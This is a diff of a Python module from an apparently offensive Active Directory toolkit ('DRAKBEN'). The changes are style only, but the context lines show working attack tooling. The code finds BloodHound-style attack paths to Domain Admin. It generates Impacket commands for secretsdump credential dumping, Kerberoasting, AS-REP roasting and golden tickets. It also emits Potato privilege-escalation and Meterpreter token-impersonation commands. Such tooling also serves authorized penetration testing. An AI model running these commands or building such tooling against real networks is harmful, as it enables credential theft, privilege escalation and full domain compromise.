@@ -1,5 +1,4 @@
-"""
-DRAKBEN Advanced AD Extensions - BloodHound Integration & Token Impersonation
+"""DRAKBEN Advanced AD Extensions - BloodHound Integration & Token Impersonation
 Author: @drak_ben
 Description: Advanced Active Directory attack features.
 
@@ -28,7 +27,7 @@ logger = logging.getLogger(__name__)
 
 
 class BloodHoundRelationship(Enum):
-    """BloodHound-style relationship types"""
+    """BloodHound-style relationship types."""
 
     MEMBER_OF = "MemberOf"
     HAS_SESSION = "HasSession"
@@ -49,7 +48,7 @@ class BloodHoundRelationship(Enum):
 
 
 class ImpacketTool(Enum):
-    """Impacket tools for AD attacks"""
+    """Impacket tools for AD attacks."""
 
     PSEXEC = "psexec.py"
     WMIEXEC = "wmiexec.py"
@@ -67,7 +66,7 @@ class ImpacketTool(Enum):
 
 
 class TokenPrivilege(Enum):
-    """Windows token privileges"""
+    """Windows token privileges."""
 
     DEBUG = "SeDebugPrivilege"
     IMPERSONATE = "SeImpersonatePrivilege"
@@ -86,7 +85,7 @@ class TokenPrivilege(Enum):
 
 @dataclass
 class BloodHoundNode:
-    """BloodHound graph node (User, Computer, Group, etc.)"""
+    """BloodHound graph node (User, Computer, Group, etc.)."""
 
     object_id: str  # SID or unique ID
     name: str
@@ -114,7 +113,7 @@ class BloodHoundNode:
 
 @dataclass
 class BloodHoundEdge:
-    """BloodHound graph edge (relationship)"""
+    """BloodHound graph edge (relationship)."""
 
     source: str  # Source object ID
     target: str  # Target object ID
@@ -132,7 +131,7 @@ class BloodHoundEdge:
 
 @dataclass
 class AttackChain:
-    """Chain of attacks from source to target"""
+    """Chain of attacks from source to target."""
 
     source: BloodHoundNode
     target: BloodHoundNode
@@ -146,7 +145,7 @@ class AttackChain:
 
 @dataclass
 class TokenInfo:
-    """Windows token information"""
+    """Windows token information."""
 
     username: str
     domain: str
@@ -163,8 +162,7 @@ class TokenInfo:
 
 
 class BloodHoundAnalyzer:
-    """
-    BloodHound-style graph analysis for AD attack paths.
+    """BloodHound-style graph analysis for AD attack paths.
 
     Features:
     - Build attack graph from collected data
@@ -173,7 +171,7 @@ class BloodHoundAnalyzer:
     - Export to BloodHound compatible format
     """
 
-    def __init__(self):
+    def __init__(self) -> None:
         self.nodes: dict[str, BloodHoundNode] = {}
         self.edges: list[BloodHoundEdge] = []
         self._adjacency: dict[str, list[BloodHoundEdge]] = {}
@@ -181,13 +179,13 @@ class BloodHoundAnalyzer:
         logger.info("BloodHound analyzer initialized")
 
     def add_node(self, node: BloodHoundNode) -> None:
-        """Add node to the graph"""
+        """Add node to the graph."""
         self.nodes[node.object_id] = node
         if node.object_id not in self._adjacency:
             self._adjacency[node.object_id] = []
 
     def add_edge(self, edge: BloodHoundEdge) -> None:
-        """Add edge (relationship) to the graph"""
+        """Add edge (relationship) to the graph."""
         self.edges.append(edge)
 
         if edge.source not in self._adjacency:
@@ -203,7 +201,7 @@ class BloodHoundAnalyzer:
         admin_count: bool = False,
         high_value: bool = False,
     ) -> BloodHoundNode:
-        """Add user node to graph"""
+        """Add user node to graph."""
         node = BloodHoundNode(
             object_id=sid,
             name=f"{username}@{domain}".upper(),
@@ -224,7 +222,7 @@ class BloodHoundAnalyzer:
         os: str = "Windows",
         high_value: bool = False,
     ) -> BloodHoundNode:
-        """Add computer node to graph"""
+        """Add computer node to graph."""
         node = BloodHoundNode(
             object_id=sid,
             name=f"{hostname}.{domain}".upper(),
@@ -240,9 +238,13 @@ class BloodHoundAnalyzer:
         return node
 
     def add_group(
-        self, sid: str, name: str, domain: str, high_value: bool = False
+        self,
+        sid: str,
+        name: str,
+        domain: str,
+        high_value: bool = False,
     ) -> BloodHoundNode:
-        """Add group node to graph"""
+        """Add group node to graph."""
         # Check for high-value groups
         hv_groups = [
             "DOMAIN ADMINS",
@@ -265,7 +267,7 @@ class BloodHoundAnalyzer:
         return node
 
     def add_membership(self, member_sid: str, group_sid: str) -> None:
-        """Add group membership relationship"""
+        """Add group membership relationship."""
         edge = BloodHoundEdge(
             source=member_sid,
             target=group_sid,
@@ -274,7 +276,7 @@ class BloodHoundAnalyzer:
         self.add_edge(edge)
 
     def add_admin_rights(self, user_sid: str, computer_sid: str) -> None:
-        """Add admin rights relationship"""
+        """Add admin rights relationship."""
         edge = BloodHoundEdge(
             source=user_sid,
             target=computer_sid,
@@ -283,7 +285,7 @@ class BloodHoundAnalyzer:
         self.add_edge(edge)
 
     def add_session(self, user_sid: str, computer_sid: str) -> None:
-        """Add session relationship"""
+        """Add session relationship."""
         edge = BloodHoundEdge(
             source=computer_sid,
             target=user_sid,
@@ -292,8 +294,7 @@ class BloodHoundAnalyzer:
         self.add_edge(edge)
 
     def find_shortest_path(self, source_id: str, target_id: str) -> AttackChain | None:
-        """
-        Find shortest attack path using BFS.
+        """Find shortest attack path using BFS.
 
         Args:
             source_id: Source node object ID
@@ -301,6 +302,7 @@ class BloodHoundAnalyzer:
 
         Returns:
             AttackChain or None if no path exists
+
         """
         if source_id not in self.nodes or target_id not in self.nodes:
             return None
@@ -328,15 +330,16 @@ class BloodHoundAnalyzer:
             for edge in self._adjacency.get(current, []):
                 if edge.target not in visited:
                     visited.add(edge.target)
-                    queue.append((edge.target, path + [edge]))
+                    queue.append((edge.target, [*path, edge]))
 
         return None
 
     def find_paths_to_high_value(
-        self, source_id: str, max_depth: int = 5
+        self,
+        source_id: str,
+        max_depth: int = 5,
     ) -> list[AttackChain]:
-        """
-        Find all paths to high-value targets.
+        """Find all paths to high-value targets.
 
         Args:
             source_id: Starting node
@@ -344,6 +347,7 @@ class BloodHoundAnalyzer:
 
         Returns:
             List of attack chains to high-value targets
+
         """
         paths = []
 
@@ -361,7 +365,7 @@ class BloodHoundAnalyzer:
         return paths
 
     def get_kerberoastable(self) -> list[BloodHoundNode]:
-        """Get users with SPNs (Kerberoastable)"""
+        """Get users with SPNs (Kerberoastable)."""
         kerberoastable = []
 
         for node in self.nodes.values():
@@ -372,7 +376,7 @@ class BloodHoundAnalyzer:
         return kerberoastable
 
     def get_asrep_roastable(self) -> list[BloodHoundNode]:
-        """Get users without pre-auth (AS-REP Roastable)"""
+        """Get users without pre-auth (AS-REP Roastable)."""
         asrep = []
 
         for node in self.nodes.values():
@@ -383,18 +387,18 @@ class BloodHoundAnalyzer:
         return asrep
 
     def get_owned_nodes(self) -> list[BloodHoundNode]:
-        """Get all owned nodes"""
+        """Get all owned nodes."""
         return [n for n in self.nodes.values() if n.owned]
 
     def mark_owned(self, node_id: str) -> bool:
-        """Mark a node as owned (compromised)"""
+        """Mark a node as owned (compromised)."""
         if node_id in self.nodes:
             self.nodes[node_id].owned = True
             return True
         return False
 
     def export_json(self, filepath: str) -> None:
-        """Export graph to BloodHound-compatible JSON"""
+        """Export graph to BloodHound-compatible JSON."""
         data = {
             "meta": {
                 "type": "computers,users,groups",
@@ -407,10 +411,10 @@ class BloodHoundAnalyzer:
         with open(filepath, "w") as f:
             json.dump(data, f, indent=2)
 
-        logger.info(f"Exported graph to {filepath}")
+        logger.info("Exported graph to %s", filepath)
 
     def _edge_to_technique(self, edge: BloodHoundEdge) -> str:
-        """Convert edge relationship to attack technique description"""
+        """Convert edge relationship to attack technique description."""
         technique_map = {
             BloodHoundRelationship.MEMBER_OF: "Group Membership",
             BloodHoundRelationship.ADMIN_TO: "Local Admin Access",
@@ -424,7 +428,7 @@ class BloodHoundAnalyzer:
         return technique_map.get(edge.relationship, edge.relationship.value)
 
     def get_statistics(self) -> dict[str, Any]:
-        """Get graph statistics"""
+        """Get graph statistics."""
         node_types = {}
         for node in self.nodes.values():
             node_types[node.node_type] = node_types.get(node.node_type, 0) + 1
@@ -450,8 +454,7 @@ class BloodHoundAnalyzer:
 
 
 class ImpacketWrapper:
-    """
-    Wrapper for Impacket tools.
+    """Wrapper for Impacket tools.
 
     Provides:
     - Command generation for all Impacket tools
@@ -459,12 +462,12 @@ class ImpacketWrapper:
     - Credential handling
     """
 
-    def __init__(self, impacket_path: str = None):
-        """
-        Initialize Impacket wrapper.
+    def __init__(self, impacket_path: str | None = None) -> None:
+        """Initialize Impacket wrapper.
 
         Args:
             impacket_path: Path to impacket scripts (auto-detect if None)
+
         """
         self.impacket_path = impacket_path or self._find_impacket()
         self.available_tools: list[ImpacketTool] = []
@@ -473,11 +476,11 @@ class ImpacketWrapper:
             self._check_available_tools()
 
         logger.info(
-            f"Impacket wrapper initialized: {len(self.available_tools)} tools available"
+            f"Impacket wrapper initialized: {len(self.available_tools)} tools available",
         )
 
     def _find_impacket(self) -> str | None:
-        """Try to find impacket installation"""
+        """Try to find impacket installation."""
         # Check common locations
         paths_to_check = [
             "/usr/share/doc/python3-impacket/examples",
@@ -493,24 +496,26 @@ class ImpacketWrapper:
         # Check if in PATH
         try:
             result = subprocess.run(
-                ["which", ImpacketTool.PSEXEC.value], capture_output=True, text=True
+                ["which", ImpacketTool.PSEXEC.value],
+                capture_output=True,
+                text=True,
             )
             if result.returncode == 0:
                 return os.path.dirname(result.stdout.strip())
         except Exception as e:
-            logger.debug(f"Failed to find impacket in PATH: {e}")
+            logger.debug("Failed to find impacket in PATH: %s", e)
 
         return None
 
     def _check_available_tools(self) -> None:
-        """Check which Impacket tools are available"""
+        """Check which Impacket tools are available."""
         for tool in ImpacketTool:
             tool_path = os.path.join(self.impacket_path, tool.value)
             if os.path.exists(tool_path):
                 self.available_tools.append(tool)
 
     def is_available(self, tool: ImpacketTool) -> bool:
-        """Check if a specific tool is available"""
+        """Check if a specific tool is available."""
         return tool in self.available_tools
 
     def generate_command(
@@ -519,13 +524,12 @@ class ImpacketWrapper:
         target: str,
         domain: str = "",
         username: str = "",
-        password: str = None,
-        ntlm_hash: str = None,
+        password: str | None = None,
+        ntlm_hash: str | None = None,
         kerberos: bool = False,
-        additional_args: list[str] = None,
+        additional_args: list[str] | None = None,
     ) -> str:
-        """
-        Generate Impacket command.
+        """Generate Impacket command.
 
         Args:
             tool: Impacket tool to use
@@ -539,6 +543,7 @@ class ImpacketWrapper:
 
         Returns:
             Command string
+
         """
         cmd_parts = []
 
@@ -575,12 +580,12 @@ class ImpacketWrapper:
         target: str,
         domain: str,
         username: str,
-        password: str = None,
-        ntlm_hash: str = None,
+        password: str | None = None,
+        ntlm_hash: str | None = None,
         just_dc: bool = False,
-        just_dc_user: str = None,
+        just_dc_user: str | None = None,
     ) -> str:
-        """Generate secretsdump.py command"""
+        """Generate secretsdump.py command."""
         args = []
 
         if just_dc:
@@ -603,11 +608,11 @@ class ImpacketWrapper:
         target: str,
         domain: str,
         username: str,
-        password: str = None,
-        ntlm_hash: str = None,
-        output_file: str = None,
+        password: str | None = None,
+        ntlm_hash: str | None = None,
+        output_file: str | None = None,
     ) -> str:
-        """Generate GetUserSPNs.py command (Kerberoasting)"""
+        """Generate GetUserSPNs.py command (Kerberoasting)."""
         args = ["-request"]
 
         if output_file:
@@ -627,11 +632,11 @@ class ImpacketWrapper:
         self,
         target: str,
         domain: str,
-        username: str = None,
-        usersfile: str = None,
-        output_file: str = None,
+        username: str | None = None,
+        usersfile: str | None = None,
+        output_file: str | None = None,
     ) -> str:
-        """Generate GetNPUsers.py command (AS-REP Roasting)"""
+        """Generate GetNPUsers.py command (AS-REP Roasting)."""
         args = ["-no-pass"]
 
         if usersfile:
@@ -652,7 +657,7 @@ class ImpacketWrapper:
         groups: str = "512,513,518,519,520",
         golden: bool = True,
     ) -> str:
-        """Generate ticketer.py for Golden/Silver ticket"""
+        """Generate ticketer.py for Golden/Silver ticket."""
         args = [
             f"-domain {domain}",
             f"-domain-sid {domain_sid}",
@@ -674,8 +679,7 @@ class ImpacketWrapper:
 
 
 class TokenImpersonator:
-    """
-    Windows Token Impersonation techniques.
+    """Windows Token Impersonation techniques.
 
     Techniques:
     - Token duplication
@@ -684,17 +688,17 @@ class TokenImpersonator:
     - Potato attacks helper
     """
 
-    def __init__(self):
+    def __init__(self) -> None:
         self.captured_tokens: list[TokenInfo] = []
         self.current_token: TokenInfo | None = None
         logger.info("Token impersonator initialized")
 
     def get_current_token_info(self) -> TokenInfo | None:
-        """
-        Get information about current process token (Windows only).
+        """Get information about current process token (Windows only).
 
         Returns:
             TokenInfo or None if not on Windows
+
         """
         if os.name != "nt":
             logger.warning("Token impersonation only works on Windows")
@@ -722,14 +726,16 @@ class TokenImpersonator:
             )
 
         except Exception as e:
-            logger.error(f"Failed to get token info: {e}")
+            logger.exception("Failed to get token info: %s", e)
             return None
 
     def generate_potato_command(
-        self, technique: str = "sweet", command: str = "cmd.exe", clsid: str = None
+        self,
+        technique: str = "sweet",
+        command: str = "cmd.exe",
+        clsid: str | None = None,
     ) -> str:
-        """
-        Generate Potato attack command.
+        """Generate Potato attack command.
 
         Potato attacks abuse Windows service impersonation to escalate
         from service accounts to SYSTEM.
@@ -741,25 +747,27 @@ class TokenImpersonator:
 
         Returns:
             Command string
+
         """
         if technique == "sweet":
             # SweetPotato
             return f"SweetPotato.exe -e {command} -p cmd"
-        elif technique == "juicy":
+        if technique == "juicy":
             # JuicyPotato
             clsid = clsid or "{4991d34b-80a1-4291-83b6-3328366b9097}"
             return f"JuicyPotato.exe -l 1337 -p {command} -t * -c {clsid}"
-        elif technique == "rogue":
+        if technique == "rogue":
             # RoguePotato
             return f'RoguePotato.exe -r 10.0.0.1 -e "{command}"'
-        else:
-            return f"# Unknown potato technique: {technique}"
+        return f"# Unknown potato technique: {technique}"
 
     def generate_incognito_command(
-        self, action: str = "list_tokens", token_user: str = None, command: str = None
+        self,
+        action: str = "list_tokens",
+        token_user: str | None = None,
+        command: str | None = None,
     ) -> str:
-        """
-        Generate Incognito/Metasploit token commands.
+        """Generate Incognito/Metasploit token commands.
 
         Args:
             action: list_tokens, impersonate, or execute
@@ -768,21 +776,24 @@ class TokenImpersonator:
 
         Returns:
             Command string (Meterpreter format)
+
         """
         if action == "list_tokens":
             return "list_tokens -u"
-        elif action == "impersonate" and token_user:
+        if action == "impersonate" and token_user:
             return f"impersonate_token '{token_user}'"
-        elif action == "execute" and token_user and command:
+        if action == "execute" and token_user and command:
             return f"execute -t -i -H -c '{command}'"
-        else:
-            return "# Invalid incognito command"
+        return "# Invalid incognito command"
 
     def generate_runas_command(
-        self, username: str, domain: str, command: str, netonly: bool = False
+        self,
+        username: str,
+        domain: str,
+        command: str,
+        netonly: bool = False,
     ) -> str:
-        """
-        Generate runas command for credential use.
+        """Generate runas command for credential use.
 
         Args:
             username: Username
@@ -792,16 +803,17 @@ class TokenImpersonator:
 
         Returns:
             Command string
+
         """
         flags = "/netonly" if netonly else ""
         return f'runas {flags} /user:{domain}\\{username} "{command}"'
 
     def generate_psexec_system_command(self, command: str = "cmd.exe") -> str:
-        """Generate PsExec command to get SYSTEM"""
+        """Generate PsExec command to get SYSTEM."""
         return f"psexec.exe -i -s {command}"
 
     def get_impersonation_techniques(self) -> list[dict[str, str]]:
-        """Get list of available impersonation techniques"""
+        """Get list of available impersonation techniques."""
         return [
             {
                 "name": "Potato Attacks",
@@ -851,7 +863,7 @@ _token_impersonator: TokenImpersonator | None = None
 
 
 def get_bloodhound_analyzer() -> BloodHoundAnalyzer:
-    """Get singleton BloodHound analyzer"""
+    """Get singleton BloodHound analyzer."""
     global _bloodhound_analyzer
     if _bloodhound_analyzer is None:
         _bloodhound_analyzer = BloodHoundAnalyzer()
@@ -859,7 +871,7 @@ def get_bloodhound_analyzer() -> BloodHoundAnalyzer:
 
 
 def get_impacket_wrapper() -> ImpacketWrapper:
-    """Get singleton Impacket wrapper"""
+    """Get singleton Impacket wrapper."""
     global _impacket_wrapper
     if _impacket_wrapper is None:
         _impacket_wrapper = ImpacketWrapper()
@@ -867,7 +879,7 @@ def get_impacket_wrapper() -> ImpacketWrapper:
 
 
 def get_token_impersonator() -> TokenImpersonator:
-    """Get singleton Token impersonator"""
+    """Get singleton Token impersonator."""
     global _token_impersonator
     if _token_impersonator is None:
         _token_impersonator = TokenImpersonator()
@@ -875,10 +887,10 @@ def get_token_impersonator() -> TokenImpersonator:
 
 
 def find_path_to_domain_admin(
-    source_sid: str, analyzer: BloodHoundAnalyzer = None
+    source_sid: str,
+    analyzer: BloodHoundAnalyzer = None,
 ) -> AttackChain | None:
-    """
-    Convenience function to find path to Domain Admin.
+    """Convenience function to find path to Domain Admin.
 
     Args:
         source_sid: Starting node SID
@@ -886,6 +898,7 @@ def find_path_to_domain_admin(
 
     Returns:
         AttackChain or None
+
     """
     if analyzer is None:
         analyzer = get_bloodhound_analyzer()
